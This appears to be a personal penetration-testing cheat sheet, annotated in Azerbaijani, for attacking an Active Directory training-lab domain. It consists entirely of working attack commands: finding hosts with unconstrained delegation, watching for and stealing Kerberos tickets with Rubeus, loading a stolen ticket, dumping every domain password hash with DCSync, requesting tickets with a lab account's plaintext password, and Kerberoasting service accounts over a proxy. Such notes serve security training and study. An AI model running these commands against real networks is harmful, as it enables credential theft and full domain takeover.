# Double Hop Enumeration
```
# Unconstrained Delegation aktiv olan bütün kompüterləri tap
Get-DomainComputer -Unconstrained | select name, distinguishedname, operatingsystem
```

# Admin səlahiyyəti ilə TGT izləmə
```
# Yeni biletləri (TGT) hər 5 saniyədən bir yoxla və ekrana çıxar
.\Rubeus.exe monitor /interval:5 /nowrap

# Oğurlanmış bileti yaddaşa yükləyirik
.\Rubeus.exe ptt /ticket:<BASE64_BİLET_BURAYA>

# Bütün domain-in şifrə bazasını (NTDS.dit) kopyalayırıq
lsadump::dcsync /domain:inlanefreight.local /all /csv
```

# Rubeus ilə TGT asktgt
```
.\Rubeus.exe asktgt /user:backupadm /domain:INLANEFREIGHT.LOCAL /password:'!qazXSW@' /ptt
Get-DomainUser -SPN
```

# AD-Searcher (LDAP-ı birbaşa çağır)
```
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$dc = ($domain.DomainControllers[0]).Name
Get-DomainUser -SPN -DomainController $dc
```

# Evil-WinRM-dən kənara çıx (Kkali/Linux tərəfdən)
```
proxychains GetUserSPNs.py -request -dc-ip 172.16.8.5 INLANEFREIGHT.LOCAL/backupadm:'!qazXSW@'
```

# 
```
# Bütün SPN-i olan istifadəçilərin biletlərini çək (Kerberoasting)
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat
```



